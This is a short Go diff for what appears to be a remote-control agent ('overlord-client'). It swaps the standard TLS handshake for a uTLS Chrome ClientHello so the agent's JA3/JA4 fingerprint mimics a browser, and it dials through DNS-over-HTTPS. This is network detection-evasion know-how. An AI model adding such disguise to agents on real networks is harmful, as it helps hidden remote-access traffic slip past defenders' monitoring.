@@ -33,6 +33,7 @@ import (
 	rt "overlord-client/cmd/agent/runtime"
 	"overlord-client/cmd/agent/sysinfo"
 	agentTLS "overlord-client/cmd/agent/tlsconfig"
+	"overlord-client/cmd/agent/tlsfingerprint"
 	"overlord-client/cmd/agent/wire"
 
 	"nhooyr.io/websocket"
@@ -468,12 +469,12 @@ func createHTTPTransport(cfg config.Config) (*http.Transport, error) {
 	}
 
 	transport := http.DefaultTransport.(*http.Transport).Clone()
-	transport.TLSClientConfig = tlsConfig
+	// Do not set TLSClientConfig — uTLS owns the handshake entirely.
 	// Use DoH-aware dialer with TCP keepalive so the OS detects silent link
 	// drops (NAT timeout, middlebox reset) within ~10 s instead of waiting
 	// for the 45 s pong grace period.
 	dohDialer := doh.NewDialer()
-	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+	tcpDial := func(ctx context.Context, network, addr string) (net.Conn, error) {
 		conn, err := dohDialer(ctx, network, addr)
 		if err != nil {
 			return nil, err
@@ -484,6 +485,10 @@ func createHTTPTransport(cfg config.Config) (*http.Transport, error) {
 		}
 		return conn, nil
 	}
+	transport.DialContext = tcpDial
+	// DialTLSContext replaces the standard Go TLS handshake with a uTLS
+	// Chrome-133 ClientHello so the JA3/JA4 fingerprint looks like a browser.
+	transport.DialTLSContext = tlsfingerprint.UTLSDialFunc(tcpDial, tlsConfig)
 	return transport, nil
 }
 
